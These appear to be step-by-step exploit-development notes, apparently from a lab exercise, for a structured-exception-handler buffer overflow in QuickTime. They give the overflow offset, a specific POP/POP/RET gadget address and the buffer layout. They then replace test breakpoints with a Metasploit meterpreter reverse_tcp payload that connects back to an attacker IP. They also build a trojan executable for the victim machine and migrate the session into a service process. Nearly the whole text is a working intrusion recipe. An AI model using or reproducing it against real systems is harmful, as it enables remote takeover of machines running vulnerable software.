1. Use immunity debugger to generate pattern of the length of the PoC (3000) [xpl-2.py]:
    - !mona pattern_create 3000
    - xpl: file + ptrn
    [*] As we can see, the program crashes for an invalid write, not overwriting sEIP.
        If we check SEH (Alt+s) we find that SEH has been overwritten!
        When the crash happens, SEH will be called!

2. Find pattern with which the NSEH value has been overwritten (position 2302):
    - !mona findmsp

4. Find a POP/POP/RET instruction from a non ASLR/Rebased/SafeSEH module
    - !mona seh 
    - 0x677a321b (# pop esi # pop edi # ret  | [QuickTimeAuthoring.qtx])

5. Overwrite nSEH with jmp 0x06 and SEH Handler with POP/POP/RET [xpl-3.py]
    - xpl: content + junk[16756] + nseh + sehhandler
    [*] There is no need to add padding to overflow stack because a write from an invalid 
        location is done. That will trigger SEH Handler
    - add breakpoint in SEH Handler to check it's executed

6.  Place CC asm instruction to check if everything is working  [xpl-4.py]
    - xpl: content + junk[2302] + nseh + sehhandler + payload + 0xCCCCCCCC

7. Exchange the breakpoint instructions with your preferred payload [xpl-5.py]
    - In this case we will use the metasploit meterpreter!
        1. Check VM are in the same network.
        2. We'll use msfpayload to generate payload and msfconsole to handle connection
            2.1. In msfconsole:
                - msf> use exploit/multi/handler
                - msf> set PAYLOAD windows/meterpreter/reverse_tcp
                - msf> set LHOST <ip_metasploit>      (not 127.0.0.1)
                - msf> exploit
            2.2. In msfpayload:
                2.2.1. First we will create a binary as a trojan to test handler:
                    - msfpayload windows/meterpreter/reverse_tcp
                      LHOST=172.16.0.53 PrependMigrate=true X > meterpreter_rev_tcp.exe
                    - Copy it to vulnerable machine and double click it!
                    - It works!
                2.2.2. Generate payload.py for using it in the exploit:
                    - msfpayload windows/meterpreter/reverse_tcp
                      LHOST=172.16.0.53 N > payload.py
                    - move payload.py to exploiting machine.
                    - create __init__.py file in exploit directory
                    - open payload.py and:  :9,33s/buf/stage1
                    - save.
                    - open xpl-5.py and 'from payload import stage1'
                    - xpl: content + junk[2302] + nseh + seh + stage1
        
        [*] NOTE1: stage1 is code to connect back to attacker machine. then the stage2 code
            will be injected into process.
        [*] NOTE2: look how Quicktime freezes and crashes when you close meterpreter session. 
            Let's solve this. Change EXITFUNC to thread!
            It doesn't work! 
            You can 'ps' from meterpreter and 'migrate <newpid>' to store payload in a service.
        


